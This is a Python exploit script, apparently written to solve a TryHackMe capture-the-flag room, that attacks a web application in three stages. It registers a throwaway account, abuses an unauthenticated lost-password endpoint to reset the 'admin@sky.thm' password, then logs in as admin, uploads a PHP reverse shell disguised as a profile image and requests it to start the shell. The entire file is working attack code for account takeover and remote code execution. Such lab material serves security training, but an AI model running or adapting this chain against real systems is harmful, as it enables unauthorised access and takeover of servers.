#!/usr/bin/env python3

import argparse
import os
import pickle
import platform
import random
import re
import requests
import string

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Custom Classes
############################################################

class mallard:

    def __init__(self, baseurl):

        if not(isinstance(baseurl, str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        self.baseurl = baseurl
        self.session = requests.Session()

        return


    def LoginUser(self, userinfo):
        message = str()
        success = bool()
        targetroute = "v2/admin/logincheck.php"
        targeturl = f"{self.baseurl}/{targetroute}"

        try:
            SysMsgNB(f"logging in \"{userinfo.username}\" ...")

            data = {
                "user": userinfo.username,
                "pass": userinfo.password,
            }

            resp = self.session.post(targeturl, data=data)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = f"\"{userinfo.username}\" successfully logged in"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def LogoutUser(self):
        message = str()
        success = bool()
        targetroute = "v2/admin/logout.php"
        targeturl = f"{self.baseurl}/{targetroute}"

        try:
            resp = self.session.get(targeturl)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = "logout successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)


    def RegisterNewUser(self):
        message = str()
        newuser = user()
        success = bool()
        targetroute = "v2/admin/reg.php"
        targeturl = f"{self.baseurl}/{targetroute}"

        try:
            SysMsgNB("generating username ...")
            newuser.username, success, message = GenRandomString(maxlen=9)
            if not(success):
                raise ValueError(f"error generating username: {message}")
            newuser.username = f"{newuser.username}@test.local"

            SysMsgNB("generating password ...")
            newuser.password, success, message = GenRandomString()
            if not(success):
                raise ValueError(f"error generating password: {message}")

            SysMsgNB(f"registering \"{newuser.username}\" ...")

            data = {
                "User_Email": newuser.username,
                "User_Pass": newuser.password,
                "conpass": newuser.password,
                "Us_Cont": "1"*10,
                "CSRF_Token": "",
                "submit": ""
            }

            resp = self.session.post(targeturl, data=data, allow_redirects=False)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = f"\"{newuser.username}\" successfully registered"
            success = True
        except Exception as ex:
            message = str(ex)
            newuser = None
            success = False

        return (newuser, success, message)

    def TriggerShell(self, shellname):
        message = str()
        success = bool()
        targetroute = f"v2/profileimages/{shellname}"
        targeturl = f"{self.baseurl}/{targetroute}"

        try:
            SysMsgNB("tiggering reverse shell ...")
            resp = self.session.get(targeturl, timeout=10)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = "reverse shell endpoint successfully hit"
            success = True
        except requests.exceptions.ReadTimeout:
            message = "timeout encountered. reverse shell running."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def UpdatePassword(self, username=None):
        message = str()
        newpass = str()
        success = bool()
        targetroute = "v2/lostpassword.php"
        targeturl = f"{self.baseurl}/{targetroute}"
        
        try:
            if username is None:
                username = "admin@sky.thm"
            elif not(isinstance(username, str)):
                raise TypeError(f"Username must be a string. Got {type(username)}")

            newpass, success, message = GenRandomString()
            if not(success):
                raise ValueError(f"error generating password: {message}")

            data = {
                "uname": username,
                "npass": newpass,
                "cpass": newpass,
                "ci_csrf_token": "",
                "send": "Submit"
            }

            resp = self.session.post(targeturl, data=data)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = f"password for \"{username}\" changed to \"{newpass}\""
            success = True
        except Exception as ex:
            newpass = ""
            message = str(ex)
            success = False

        return (newpass, success, message)

    def UploadShell(self, shellname):
        message = str()
        success = bool()
        targetroute = "v2/profile.php"
        targeturl = f"{self.baseurl}/{targetroute}"

        try:
            if not(os.path.exists(shellname)):
                raise ValueError(f"could not find \"{shellname}\"")

            files = {
                "pimage": open(shellname, "rb")
            }

            data = {
                "uname": "ADMIN",
                "submit": "Edit Profile"
            }

            resp = self.session.post(targeturl, data=data, files=files, allow_redirects=False)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            message = "reverse shell successfully uploaded"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

class user:
    def __init__(self, username=None, password=None):
        if username is None:
            self.username = ""
        else:
            if not(isinstance(username, str)):
                raise TypeError(f"Username must be a string. Got {type(username)}")

            self.username = username

        if password is None:
            self.password = ""
        else:
            if not(isinstance(password, str)):
                raise TypeError(f"Password must be a string. Got {type(password)}")

            self.password = password

        return

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False

    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("-r", "--revshell", help="reverse shell to upload", type=str, dest="revshell", default="revshell.php")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    revshell = args.revshell
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Shell: {revshell}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    try:
        adminuser = user("admin@sky.thm")

        duck = mallard(baseURL)

        print(f"\n{ANSI_YLW}{' Stage 1: Update Admin Pass ':=^60}{ANSI_RST}\n")

        newuser, success, message = duck.RegisterNewUser()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = duck.LoginUser(newuser)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        adminuser.password, success, message = duck.UpdatePassword(adminuser.username)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = duck.LogoutUser()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        print(f"\n{ANSI_YLW}{' Stage 2: Upload Reverse Shell ':=^60}{ANSI_RST}\n")

        success, message = duck.LoginUser(adminuser)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = duck.UploadShell(revshell)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = duck.LogoutUser()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        print(f"\n{ANSI_YLW}{' Stage 3: Trigger Reverse Shell ':=^60}{ANSI_RST}\n")

        success, message = duck.TriggerShell(revshell)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

    except Exception as ex:
        ErrMsg(str(ex))
        exit(1)

    return

if __name__ == "__main__":
    main()

